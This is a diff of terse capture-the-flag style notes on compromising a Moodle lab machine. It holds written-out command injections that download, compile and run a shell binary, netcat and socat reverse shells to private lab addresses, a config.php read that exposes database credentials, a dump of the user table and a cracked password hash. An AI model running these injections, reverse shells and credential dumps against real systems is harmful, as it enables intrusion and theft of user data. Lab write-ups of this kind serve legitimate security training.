@@ -33,4 +33,28 @@ our = nc -nvlp 20000
 &0=(date; ping -c 1 10.10.14.62)
 &0=(date; wget http://10.10.13.136:8000/shell.c;gcc shell.c -o shell;./shell)
 &0=(date; nc 10.10.13.136 20000 -e /bin/bash)
-whoami -> www-data 
+whoami -> www-data
+our = socat file:`tty`,raw,echo=0 tcp-listen:4444 
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.56:4444
+
+cat ../config.php
+$CFG->dbtype    = 'mariadb';
+$CFG->dblibrary = 'native';
+$CFG->dbhost    = 'localhost';
+$CFG->dbname    = 'moodle';
+$CFG->dbuser    = 'root';
+$CFG->dbpass    = 'Welkom1!';
+$CFG->prefix    = 'mdl_';
+
+mysql -u root -p --> and then paste Welkom1!
+mysql --user=root --password=Welkom1! -e 'use moodle; select * from mdl_user'
+decode the weird hash ->  7a860966115182402ed06375cf0a22af -> expelled
+Owned user
+
+-------------------------------------------------------------------------
+
+good resource
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+-------------------------------------------------------------------------
+
